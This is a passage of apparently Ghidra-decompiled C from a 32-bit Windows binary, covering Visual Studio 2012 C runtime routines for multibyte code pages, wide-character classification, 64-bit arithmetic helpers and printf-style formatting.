      lpAddend = (pthreadmbcinfo)PTR_DAT_0041a5a8;
      InterlockedIncrement((LONG *)PTR_DAT_0041a5a8);
    }
    FUN_0040d2d6();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0040d2d6(void)

{
  FUN_0040ed0f(0xd);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_0040d2df(int param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  threadmbcinfostruct *lpAddend;
  LONG LVar3;
  int *piVar4;
  pthreadmbcinfo ptVar5;
  int iVar6;
  int iVar7;
  threadmbcinfostruct *ptVar8;
  
  iVar7 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar5 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(param_1);
  if (iVar2 == ptVar5->mbcodepage) {
    iVar7 = 0;
  }
  else {
    lpAddend = (threadmbcinfostruct *)__malloc_crt(0x220);
    if (lpAddend != (threadmbcinfostruct *)0x0) {
      ptVar5 = p_Var1->ptmbcinfo;
      ptVar8 = lpAddend;
      for (iVar7 = 0x88; iVar7 != 0; iVar7 = iVar7 + -1) {
        ptVar8->refcount = ptVar5->refcount;
        ptVar5 = (pthreadmbcinfo)&ptVar5->mbcodepage;
        ptVar8 = (threadmbcinfostruct *)&ptVar8->mbcodepage;
      }
      iVar6 = 0;
      lpAddend->refcount = 0;
      iVar7 = __setmbcp_nolock(iVar2,lpAddend);
      if (iVar7 == 0) {
        LVar3 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar3 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_0041a8a8)) {
          FID_conflict__free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = lpAddend;
        InterlockedIncrement((LONG *)lpAddend);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_0041ad04 & 1) == 0)) {
          __lock(0xd);
          _DAT_0041bbe4 = lpAddend->mbcodepage;
          _DAT_0041bbe8 = lpAddend->ismbcodepage;
          _DAT_0041bbe0 = lpAddend->mblocalename;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_0041bbec)[iVar2] = lpAddend->mbulinfo[iVar2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_0041a6a0)[iVar2] = lpAddend->mbctype[iVar2];
          }
          for (; iVar6 < 0x100; iVar6 = iVar6 + 1) {
            (&DAT_0041a7a8)[iVar6] = lpAddend->mbcasemap[iVar6];
          }
          LVar3 = InterlockedDecrement((LONG *)PTR_DAT_0041a5a8);
          if ((LVar3 == 0) && (PTR_DAT_0041a5a8 != &DAT_0041a8a8)) {
            FID_conflict__free(PTR_DAT_0041a5a8);
          }
          PTR_DAT_0041a5a8 = (undefined *)lpAddend;
          InterlockedIncrement((LONG *)lpAddend);
          FUN_0040d457();
        }
      }
      else if (iVar7 == -1) {
        if (lpAddend != (threadmbcinfostruct *)&DAT_0041a8a8) {
          FID_conflict__free(lpAddend);
        }
        piVar4 = __errno();
        *piVar4 = 0x16;
      }
    }
  }
  return iVar7;
}



void FUN_0040d457(void)

{
  FUN_0040ed0f(0xd);
  return;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2012 Release

void __cdecl __setmbcp_nolock(int param_1,threadmbcinfostruct *param_2)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  BOOL BVar4;
  BYTE *pBVar5;
  uchar *puVar6;
  wchar_t *pwVar7;
  byte *pbVar8;
  int iVar9;
  byte *pbVar10;
  ushort *puVar11;
  int extraout_EDX;
  ushort *puVar12;
  uint uVar13;
  int local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  uVar2 = getSystemCP(param_1);
  if (uVar2 != 0) {
    uVar13 = 0;
    local_20 = 0;
    uVar3 = 0;
LAB_0040d4cc:
    if (*(uint *)((int)&DAT_0041a5b0 + uVar3) != uVar2) goto code_r0x0040d4d8;
    FUN_00409600((uint *)param_2->mbctype,0,0x101);
    pbVar8 = &DAT_0041a5c0 + local_20 * 0x30;
    do {
      bVar1 = *pbVar8;
      pbVar10 = pbVar8;
      while ((bVar1 != 0 && (bVar1 = pbVar10[1], bVar1 != 0))) {
        for (uVar3 = (uint)*pbVar10; (uVar3 <= bVar1 && (uVar3 < 0x100)); uVar3 = uVar3 + 1) {
          param_2->mbctype[uVar3 + 1] = param_2->mbctype[uVar3 + 1] | (&DAT_0041a5ac)[uVar13];
          bVar1 = pbVar10[1];
        }
        pbVar10 = pbVar10 + 2;
        bVar1 = *pbVar10;
      }
      uVar13 = uVar13 + 1;
      pbVar8 = pbVar8 + 8;
    } while (uVar13 < 4);
    param_2->mbcodepage = uVar2;
    param_2->ismbcodepage = 1;
    pwVar7 = CPtoLocaleName(uVar2);
    param_2->mblocalename = pwVar7;
    puVar11 = param_2->mbulinfo;
    puVar12 = (ushort *)(&DAT_0041a5b4 + extraout_EDX);
    iVar9 = 6;
    do {
      *puVar11 = *puVar12;
      puVar12 = puVar12 + 1;
      puVar11 = puVar11 + 1;
      iVar9 = iVar9 + -1;
    } while (iVar9 != 0);
    goto LAB_0040d66a;
  }
  setSBCS(param_2);
LAB_0040d674:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0040d4d8:
  local_20 = local_20 + 1;
  uVar3 = uVar3 + 0x30;
  if (0xef < uVar3) goto code_r0x0040d4e6;
  goto LAB_0040d4cc;
code_r0x0040d4e6:
  if (((uVar2 != 65000) && (uVar2 != 0xfde9)) &&
     (BVar4 = IsValidCodePage(uVar2 & 0xffff), BVar4 != 0)) {
    BVar4 = GetCPInfo(uVar2,&local_1c);
    if (BVar4 == 0) {
      if (DAT_0041bbf8 != 0) {
        setSBCS(param_2);
      }
    }
    else {
      FUN_00409600((uint *)param_2->mbctype,0,0x101);
      param_2->mbcodepage = uVar2;
      param_2->mblocalename = (wchar_t *)0x0;
      if (local_1c.MaxCharSize < 2) {
        param_2->ismbcodepage = 0;
      }
      else {
        pBVar5 = local_1c.LeadByte;
        while ((local_1c.LeadByte[0] != 0 && (bVar1 = pBVar5[1], bVar1 != 0))) {
          for (uVar2 = (uint)*pBVar5; uVar2 <= bVar1; uVar2 = uVar2 + 1) {
            param_2->mbctype[uVar2 + 1] = param_2->mbctype[uVar2 + 1] | 4;
          }
          pBVar5 = pBVar5 + 2;
          local_1c.LeadByte[0] = *pBVar5;
        }
        puVar6 = param_2->mbctype + 2;
        iVar9 = 0xfe;
        do {
          *puVar6 = *puVar6 | 8;
          puVar6 = puVar6 + 1;
          iVar9 = iVar9 + -1;
        } while (iVar9 != 0);
        pwVar7 = CPtoLocaleName(param_2->mbcodepage);
        param_2->mblocalename = pwVar7;
        param_2->ismbcodepage = 1;
      }
      *(undefined4 *)param_2->mbulinfo = 0;
      *(undefined4 *)(param_2->mbulinfo + 2) = 0;
      *(undefined4 *)(param_2->mbulinfo + 4) = 0;
LAB_0040d66a:
      setSBUpLow(param_2);
    }
  }
  goto LAB_0040d674;
}



// Library Function - Single Match
//  _iswctype
// 
// Library: Visual Studio 2012 Release

int __cdecl _iswctype(wint_t _C,wctype_t _Type)

{
  uint uVar1;
  BOOL BVar2;
  uint local_8;
  
  if (_C == 0xffff) {
    return 0;
  }
  if (_C < 0x100) {
    uVar1 = (uint)*(ushort *)(PTR_DAT_0041aee0 + (uint)_C * 2);
  }
  else {
    BVar2 = GetStringTypeW(1,(LPCWSTR)&_C,1,(LPWORD)&local_8);
    uVar1 = -(uint)(BVar2 != 0) & local_8 & 0xffff;
  }
  return uVar1 & _Type;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2012 Release

int __cdecl __wchartodigit(ushort param_1)

{
  ushort uVar1;
  int iVar2;
  
  if (0x2f < param_1) {
    if (param_1 < 0x3a) {
      return param_1 - 0x30;
    }
    iVar2 = 0xff10;
    if (param_1 < 0xff10) {
      iVar2 = 0x660;
      if (param_1 < 0x660) {
        return -1;
      }
      if (param_1 < 0x66a) goto LAB_0040d718;
      iVar2 = 0x6f0;
      if (param_1 < 0x6f0) {
        return -1;
      }
      if (param_1 < 0x6fa) goto LAB_0040d718;
      iVar2 = 0x966;
      if (param_1 < 0x966) {
        return -1;
      }
      if (param_1 < 0x970) goto LAB_0040d718;
      iVar2 = 0x9e6;
      if (param_1 < 0x9e6) {
        return -1;
      }
      if (param_1 < 0x9f0) goto LAB_0040d718;
      iVar2 = 0xa66;
      if (param_1 < 0xa66) {
        return -1;
      }
      if (param_1 < 0xa70) goto LAB_0040d718;
      iVar2 = 0xae6;
      if (param_1 < 0xae6) {
        return -1;
      }
      if (param_1 < 0xaf0) goto LAB_0040d718;
      iVar2 = 0xb66;
      if (param_1 < 0xb66) {
        return -1;
      }
      if (param_1 < 0xb70) goto LAB_0040d718;
      iVar2 = 0xc66;
      if (param_1 < 0xc66) {
        return -1;
      }
      if (param_1 < 0xc70) goto LAB_0040d718;
      iVar2 = 0xce6;
      if (param_1 < 0xce6) {
        return -1;
      }
      if (param_1 < 0xcf0) goto LAB_0040d718;
      iVar2 = 0xd66;
      if (param_1 < 0xd66) {
        return -1;
      }
      if (param_1 < 0xd70) goto LAB_0040d718;
      iVar2 = 0xe50;
      if (param_1 < 0xe50) {
        return -1;
      }
      if (param_1 < 0xe5a) goto LAB_0040d718;
      iVar2 = 0xed0;
      if (param_1 < 0xed0) {
        return -1;
      }
      if (param_1 < 0xeda) goto LAB_0040d718;
      iVar2 = 0xf20;
      if (param_1 < 0xf20) {
        return -1;
      }
      if (param_1 < 0xf2a) goto LAB_0040d718;
      iVar2 = 0x1040;
      if (param_1 < 0x1040) {
        return -1;
      }
      if (param_1 < 0x104a) goto LAB_0040d718;
      iVar2 = 0x17e0;
      if (param_1 < 0x17e0) {
        return -1;
      }
      if (param_1 < 0x17ea) goto LAB_0040d718;
      iVar2 = 0x1810;
      if (param_1 < 0x1810) {
        return -1;
      }
      uVar1 = 0x181a;
    }
    else {
      uVar1 = 0xff1a;
    }
    if (param_1 < uVar1) {
LAB_0040d718:
      return (uint)param_1 - iVar2;
    }
  }
  return -1;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2012 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2012 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



void FUN_0040d99e(void)

{
  FUN_0040ed0f(0xc);
  return;
}



// WARNING: Type propagation algorithm not settling

void __cdecl FUN_0040d9a7(FILE *param_1,byte *param_2,localeinfo_struct *param_3,int **param_4)

{
  byte bVar1;
  wchar_t _WCh;
  uint uVar2;
  undefined3 extraout_var;
  int iVar3;
  code *pcVar4;
  char *pcVar5;
  errno_t eVar6;
  int *piVar7;
  int *piVar8;
  int extraout_ECX;
  undefined *puVar9;
  byte *pbVar10;
  byte *pbVar11;
  int *piVar12;
  int *piVar13;
  int *piVar14;
  char *pcVar15;
  bool bVar16;
  longlong lVar17;
  int **ppiVar18;
  undefined4 uVar19;
  localeinfo_struct *plVar20;
  int *local_284;
  int *local_280;
  localeinfo_struct local_27c;
  int local_274;
  char local_270;
  int *local_268;
  undefined4 local_264;
  int local_260;
  int *local_25c;
  int local_258;
  int *local_254;
  undefined4 local_250;
  int local_24c;
  int local_248;
  char *local_244;
  uint local_240;
  int *local_23c;
  byte *local_238;
  int local_234;
  FILE *local_230;
  byte local_22c;
  char local_22b;
  int local_228;
  int *local_224;
  char *local_220;
  int **local_21c;
  int *local_218;
  byte local_211;
  int local_210 [127];
  undefined4 local_11;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_238 = param_2;
  piVar12 = (int *)0x0;
  local_230 = param_1;
  local_21c = param_4;
  local_258 = 0;
  local_218 = (int *)0x0;
  local_23c = (int *)0x0;
  local_224 = (int *)0x0;
  local_234 = 0;
  local_24c = 0;
  local_248 = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_27c,param_3);
  local_25c = __errno();
  if (param_1 != (FILE *)0x0) {
    if ((*(byte *)&param_1->_flag & 0x40) == 0) {
      uVar2 = __fileno(param_1);
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar9 = &DAT_0041a548;
      }
      else {
        puVar9 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0041b8c0)[(int)uVar2 >> 5]);
      }
      if ((puVar9[0x24] & 0x7f) == 0) {
        if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
          puVar9 = &DAT_0041a548;
        }
        else {
          puVar9 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0041b8c0)[(int)uVar2 >> 5]);
        }
        if ((puVar9[0x24] & 0x80) == 0) goto LAB_0040da95;
      }
    }
    else {
LAB_0040da95:
      if (local_238 != (byte *)0x0) {
        local_220 = (char *)0x0;
        local_240 = 0;
        local_254 = (int *)0x0;
        local_211 = *local_238;
        local_228 = 0;
        local_250 = CONCAT31(local_250._1_3_,local_211);
        pbVar10 = local_238;
        piVar8 = local_268;
        if (local_211 == 0) goto LAB_0040e4cc;
        do {
          local_238 = pbVar10 + 1;
          if (local_228 < 0) break;
          if ((byte)(local_211 - 0x20) < 0x59) {
            uVar2 = (byte)(&DAT_00415538)[(char)local_211] & 0xf;
          }
          else {
            uVar2 = 0;
          }
          local_240 = (uint)((byte)(&DAT_00415558)[local_240 + uVar2 * 9] >> 4);
          pbVar11 = local_238;
          switch(local_240) {
          case 0:
LAB_0040dd1c:
            local_248 = 0;
            iVar3 = __isleadbyte_l((uint)local_211,&local_27c);
            if (iVar3 != 0) {
              _write_char((byte)local_250,local_230,&local_228);
              bVar1 = *local_238;
              local_238 = local_238 + 1;
              local_250 = CONCAT31(local_250._1_3_,bVar1);
              if (bVar1 == 0) goto switchD_0040db3c_caseD_9;
            }
            _write_char((byte)local_250,local_230,&local_228);
            pbVar11 = local_238;
            break;
          case 1:
            local_224 = (int *)0xffffffff;
            piVar12 = (int *)0x0;
            local_264 = 0;
            local_24c = 0;
            local_23c = (int *)0x0;
            local_234 = 0;
            local_218 = (int *)0x0;
            local_248 = 0;
            break;
          case 2:
            if (local_211 == 0x20) {
              piVar12 = (int *)((uint)piVar12 | 2);
              local_218 = piVar12;
            }
            else if (local_211 == 0x23) {
              piVar12 = (int *)((uint)piVar12 | 0x80);
              local_218 = piVar12;
            }
            else if (local_211 == 0x2b) {
              piVar12 = (int *)((uint)piVar12 | 1);
              local_218 = piVar12;
            }
            else if (local_211 == 0x2d) {
              piVar12 = (int *)((uint)piVar12 | 4);
              local_218 = piVar12;
            }
            else if (local_211 == 0x30) {
              piVar12 = (int *)((uint)piVar12 | 8);
              local_218 = piVar12;
            }
            break;
          case 3:
            if (local_211 == 0x2a) {
              local_23c = *local_21c;
              local_21c = local_21c + 1;
              if ((int)local_23c < 0) {
                piVar12 = (int *)((uint)piVar12 | 4);
                local_23c = (int *)-(int)local_23c;
                local_218 = piVar12;
              }
            }
            else {
              local_23c = (int *)((int)local_23c * 10 + -0x30 + (int)(char)local_211);
            }
            break;
          case 4:
            local_224 = (int *)0x0;
            break;
          case 5:
            if (local_211 == 0x2a) {
              local_224 = *local_21c;
              local_21c = local_21c + 1;
              if ((int)local_224 < 0) {
                local_224 = (int *)0xffffffff;
              }
            }
            else {
              local_224 = (int *)((int)local_224 * 10 + -0x30 + (int)(char)local_211);
            }
            break;
          case 6:
            if (local_211 == 0x49) {
              bVar1 = *local_238;
              if ((bVar1 == 0x36) && (pbVar10[2] == 0x34)) {
                piVar12 = (int *)((uint)piVar12 | 0x8000);
                pbVar11 = pbVar10 + 3;
                local_218 = piVar12;
              }
              else if ((bVar1 == 0x33) && (pbVar10[2] == 0x32)) {
                piVar12 = (int *)((uint)piVar12 & 0xffff7fff);
                pbVar11 = pbVar10 + 3;
                local_218 = piVar12;
              }
              else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                       ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
                local_240 = 0;
                goto LAB_0040dd1c;
              }
            }
            else if (local_211 == 0x68) {
              piVar12 = (int *)((uint)piVar12 | 0x20);
              local_218 = piVar12;
            }
            else if (local_211 == 0x6c) {
              if (*local_238 == 0x6c) {
                piVar12 = (int *)((uint)piVar12 | 0x1000);
                pbVar11 = pbVar10 + 2;
                local_218 = piVar12;
              }
              else {
                piVar12 = (int *)((uint)piVar12 | 0x10);
                local_218 = piVar12;
              }
            }
            else if (local_211 == 0x77) {
              piVar12 = (int *)((uint)piVar12 | 0x800);
              local_218 = piVar12;
            }
            break;
          case 7:
            if ((char)local_211 < 'e') {
              if (local_211 == 100) {
LAB_0040dff3:
                piVar12 = (int *)((uint)piVar12 | 0x40);
                local_218 = piVar12;
LAB_0040dffc:
                local_220 = (char *)0xa;
LAB_0040e006:
                if ((((uint)piVar12 & 0x8000) == 0) && (((uint)piVar12 & 0x1000) == 0)) {
                  if (((uint)piVar12 & 0x20) == 0) {
                    if (((uint)piVar12 & 0x40) == 0) {
                      piVar8 = *local_21c;
                      piVar7 = (int *)0x0;
                      local_21c = local_21c + 1;
                      goto LAB_0040e1dd;
                    }
                    piVar8 = *local_21c;
                  }
                  else if (((uint)piVar12 & 0x40) == 0) {
                    piVar8 = (int *)(uint)*(ushort *)local_21c;
                  }
                  else {
                    piVar8 = (int *)(int)*(short *)local_21c;
                  }
                  piVar7 = (int *)((int)piVar8 >> 0x1f);
                  local_21c = local_21c + 1;
                }
                else {
                  piVar8 = *local_21c;
                  piVar7 = local_21c[1];
                  local_21c = local_21c + 2;
                }
LAB_0040e1dd:
                if (((((uint)piVar12 & 0x40) != 0) && ((int)piVar7 < 1)) && ((int)piVar7 < 0)) {
                  bVar16 = piVar8 != (int *)0x0;
                  piVar8 = (int *)-(int)piVar8;
                  piVar7 = (int *)-(int)((int)piVar7 + (uint)bVar16);
                  piVar12 = (int *)((uint)piVar12 | 0x100);
                  local_218 = piVar12;
                }
                if (((uint)piVar12 & 0x9000) == 0) {
                  piVar7 = (int *)0x0;
                }
                lVar17 = CONCAT44(piVar7,piVar8);
                if ((int)local_224 < 0) {
                  local_224 = (int *)0x1;
                }
                else {
                  piVar12 = (int *)((uint)piVar12 & 0xfffffff7);
                  local_218 = piVar12;
                  if (0x200 < (int)local_224) {
                    local_224 = (int *)0x200;
                  }
                }
                if (((uint)piVar8 | (uint)piVar7) == 0) {
                  local_234 = 0;
                }
                piVar7 = &local_11;
                while( true ) {
                  piVar13 = (int *)((int)local_224 + -1);
                  if (((int)local_224 < 1) && (lVar17 == 0)) break;
                  local_224 = piVar13;
                  lVar17 = __aulldvrm((uint)lVar17,(uint)((ulonglong)lVar17 >> 0x20),(uint)local_220
                                      ,(int)local_220 >> 0x1f);
                  local_244 = (char *)lVar17;
                  iVar3 = extraout_ECX + 0x30;
                  if (0x39 < iVar3) {
                    iVar3 = iVar3 + local_258;
                  }
                  *(char *)piVar7 = (char)iVar3;
                  piVar7 = (int *)((int)piVar7 + -1);
                  local_268 = piVar12;
                }
                local_220 = (char *)((int)&local_11 + -(int)piVar7);
                piVar8 = (int *)((int)piVar7 + 1);
                piVar12 = local_218;
                local_224 = piVar13;
                if ((((uint)local_218 & 0x200) != 0) &&
                   ((local_220 == (char *)0x0 || (*(char *)piVar8 != '0')))) {
                  local_220 = (char *)((int)&local_11 + -(int)piVar7 + 1);
                  *(undefined *)piVar7 = 0x30;
                  piVar8 = piVar7;
                }
              }
              else if ((char)local_211 < 'T') {
                if (local_211 == 0x53) {
                  if (((uint)piVar12 & 0x830) == 0) {
                    piVar12 = (int *)((uint)piVar12 | 0x800);
                    local_218 = piVar12;
                  }
                  goto LAB_0040de3d;
                }
                if (local_211 == 0x41) {
LAB_0040ddc2:
                  local_211 = local_211 + 0x20;
                  local_264 = 1;
LAB_0040ddd5:
                  piVar13 = (int *)((uint)piVar12 | 0x40);
                  local_244 = (char *)0x200;
                  piVar14 = local_210;
                  pcVar15 = local_244;
                  local_218 = piVar13;
                  if ((int)local_224 < 0) {
                    local_224 = (int *)0x6;
                  }
                  else if (local_224 == (int *)0x0) {
                    if (local_211 == 0x67) {
                      local_224 = (int *)0x1;
                    }
                  }
                  else {
                    if (0x200 < (int)local_224) {
                      local_224 = (int *)0x200;
                    }
                    if (0xa3 < (int)local_224) {
                      pcVar15 = (char *)((int)local_224 + 0x15d);
                      local_254 = (int *)__malloc_crt((size_t)pcVar15);
                      piVar14 = local_254;
                      if (local_254 == (int *)0x0) {
                        local_224 = (int *)0xa3;
                        piVar14 = local_210;
                        pcVar15 = local_244;
                      }
                    }
                  }
                  local_244 = pcVar15;
                  local_284 = *local_21c;
                  local_280 = local_21c[1];
                  plVar20 = &local_27c;
                  iVar3 = (int)(char)local_211;
                  ppiVar18 = &local_284;
                  piVar8 = piVar14;
                  pcVar15 = local_244;
                  piVar7 = local_224;
                  uVar19 = local_264;
                  local_21c = local_21c + 2;
                  pcVar4 = (code *)DecodePointer(PTR_LAB_0041ad38);
                  (*pcVar4)(ppiVar18,piVar8,pcVar15,iVar3,piVar7,uVar19,plVar20);
                  if ((((uint)piVar12 & 0x80) != 0) && (local_224 == (int *)0x0)) {
                    plVar20 = &local_27c;
                    piVar8 = piVar14;
                    pcVar4 = (code *)DecodePointer(PTR_LAB_0041ad44);
                    (*pcVar4)(piVar8,plVar20);
                  }
                  if ((local_211 == 0x67) && (((uint)piVar12 & 0x80) == 0)) {
                    plVar20 = &local_27c;
                    piVar8 = piVar14;
                    pcVar4 = (code *)DecodePointer(PTR_LAB_0041ad40);
                    (*pcVar4)(piVar8,plVar20);
                  }
                  if (*(char *)piVar14 == '-') {
                    local_218 = (int *)((uint)piVar12 | 0x140);
                    piVar13 = local_218;
                    piVar14 = (int *)((int)piVar14 + 1);
                  }
LAB_0040df5d:
                  piVar8 = piVar14;
                  piVar12 = piVar13;
                  local_220 = (char *)_strlen((char *)piVar8);
                }
                else if (local_211 == 0x43) {
                  if (((uint)piVar12 & 0x830) == 0) {
                    piVar12 = (int *)((uint)piVar12 | 0x800);
                    local_218 = piVar12;
                  }
LAB_0040deb6:
                  if (((uint)piVar12 & 0x810) == 0) {
                    local_210[0]._0_1_ = *(char *)local_21c;
                    local_220 = (char *)0x1;
                    local_21c = local_21c + 1;
                  }
                  else {
                    _WCh = *(wchar_t *)local_21c;
                    local_21c = local_21c + 1;
                    eVar6 = _wctomb_s((int *)&local_220,(char *)local_210,0x200,_WCh);
                    if (eVar6 != 0) {
                      local_24c = 1;
                    }
                  }
                  piVar8 = local_210;
                }
                else if ((local_211 == 0x45) || (local_211 == 0x47)) goto LAB_0040ddc2;
              }
              else {
                if (local_211 == 0x58) goto LAB_0040e151;
                if (local_211 == 0x5a) {
                  piVar7 = *local_21c;
                  local_21c = local_21c + 1;
                  piVar13 = piVar12;
                  piVar14 = (int *)PTR_DAT_0041ad0c;
                  if ((piVar7 == (int *)0x0) || (piVar8 = (int *)piVar7[1], piVar8 == (int *)0x0))
                  goto LAB_0040df5d;
                  local_220 = (char *)(int)*(wchar_t *)piVar7;
                  if (((uint)piVar12 & 0x800) == 0) {
                    local_248 = 0;
                  }
                  else {
                    local_220 = (char *)((int)local_220 / 2);
                    local_248 = 1;
                  }
                }
                else {
                  if (local_211 == 0x61) goto LAB_0040ddd5;
                  if (local_211 == 99) goto LAB_0040deb6;
                }
              }
LAB_0040e2da:
              if (local_24c == 0) {
                if (((uint)piVar12 & 0x40) != 0) {
                  if (((uint)piVar12 & 0x100) == 0) {
                    if (((uint)piVar12 & 1) == 0) {
                      if (((uint)piVar12 & 2) == 0) goto LAB_0040e321;
                      local_22c = 0x20;
                    }
                    else {
                      local_22c = 0x2b;
                    }
                  }
                  else {
                    local_22c = 0x2d;
                  }
                  local_234 = 1;
                }
LAB_0040e321:
                pcVar15 = (char *)((int)local_23c + (-local_234 - (int)local_220));
                if (((uint)piVar12 & 0xc) == 0) {
                  _write_multi_char(0x20,(int)pcVar15,local_230,&local_228);
                }
                _write_string(&local_22c,local_234,local_230,&local_228,local_25c);
                if ((((uint)piVar12 & 8) != 0) && (((uint)piVar12 & 4) == 0)) {
                  _write_multi_char(0x30,(int)pcVar15,local_230,&local_228);
                }
                if ((local_248 == 0) || (pcVar5 = local_220, piVar7 = piVar8, (int)local_220 < 1)) {
                  _write_string((byte *)piVar8,(int)local_220,local_230,&local_228,local_25c);
                }
                else {
                  do {
                    local_244 = pcVar5 + -1;
                    local_268 = (int *)((int)piVar7 + 2);
                    eVar6 = _wctomb_s(&local_260,(char *)((int)&local_11 + 1),6,*(wchar_t *)piVar7);
                    if ((eVar6 != 0) || (local_260 == 0)) {
                      local_228 = -1;
                      break;
                    }
                    _write_string((byte *)((int)&local_11 + 1),local_260,local_230,&local_228,
                                  local_25c);
                    pcVar5 = local_244;
                    piVar7 = local_268;
                  } while (local_244 != (char *)0x0);
                }
                if ((-1 < local_228) && (((uint)piVar12 & 4) != 0)) {
                  _write_multi_char(0x20,(int)pcVar15,local_230,&local_228);
                }
              }
            }
            else {
              if ('p' < (char)local_211) {
                if (local_211 == 0x73) {
LAB_0040de3d:
                  piVar7 = (int *)0x7fffffff;
                  if (local_224 != (int *)0xffffffff) {
                    piVar7 = local_224;
                  }
                  piVar13 = *local_21c;
                  local_21c = local_21c + 1;
                  piVar8 = piVar13;
                  if (((uint)piVar12 & 0x810) == 0) {
                    if (piVar13 == (int *)0x0) {
                      piVar13 = (int *)PTR_DAT_0041ad0c;
                      piVar8 = (int *)PTR_DAT_0041ad0c;
                    }
                    for (; (piVar7 != (int *)0x0 &&
                           (piVar7 = (int *)((int)piVar7 + -1), *(char *)piVar13 != '\0'));
                        piVar13 = (int *)((int)piVar13 + 1)) {
                    }
                    local_220 = (char *)((int)piVar13 - (int)piVar8);
                  }
                  else {
                    if (piVar13 == (int *)0x0) {
                      piVar8 = (int *)PTR_DAT_0041ad10;
                    }
                    local_248 = 1;
                    for (piVar13 = piVar8;
                        (piVar7 != (int *)0x0 &&
                        (piVar7 = (int *)((int)piVar7 + -1), *(wchar_t *)piVar13 != L'\0'));
                        piVar13 = (int *)((int)piVar13 + 2)) {
                    }
                    local_220 = (char *)((int)piVar13 - (int)piVar8 >> 1);
                  }
                  goto LAB_0040e2da;
                }
                if (local_211 == 0x75) goto LAB_0040dffc;
                if (local_211 != 0x78) goto LAB_0040e2da;
                local_258 = 0x27;
LAB_0040e171:
                local_220 = (char *)0x10;
                if ((char)piVar12 < '\0') {
                  local_22b = (char)local_258 + 'Q';
                  local_22c = 0x30;
                  local_234 = 2;
                }
                goto LAB_0040e006;
              }
              if (local_211 == 0x70) {
                local_224 = (int *)0x8;
LAB_0040e151:
                local_258 = 7;
                goto LAB_0040e171;
              }
              if ((char)local_211 < 'e') goto LAB_0040e2da;
              if ((char)local_211 < 'h') goto LAB_0040ddd5;
              if (local_211 == 0x69) goto LAB_0040dff3;
              if (local_211 != 0x6e) {
                if (local_211 != 0x6f) goto LAB_0040e2da;
                local_220 = (char *)0x8;
                if ((char)piVar12 < '\0') {
                  piVar12 = (int *)((uint)piVar12 | 0x200);
                  local_218 = piVar12;
                }
                goto LAB_0040e006;
              }
              piVar7 = *local_21c;
              local_21c = local_21c + 1;
              bVar16 = FUN_0040e76b();
              if (CONCAT31(extraout_var,bVar16) == 0) goto switchD_0040db3c_caseD_9;
              if (((uint)piVar12 & 0x20) == 0) {
                *piVar7 = local_228;
              }
              else {
                *(wchar_t *)piVar7 = (wchar_t)local_228;
              }
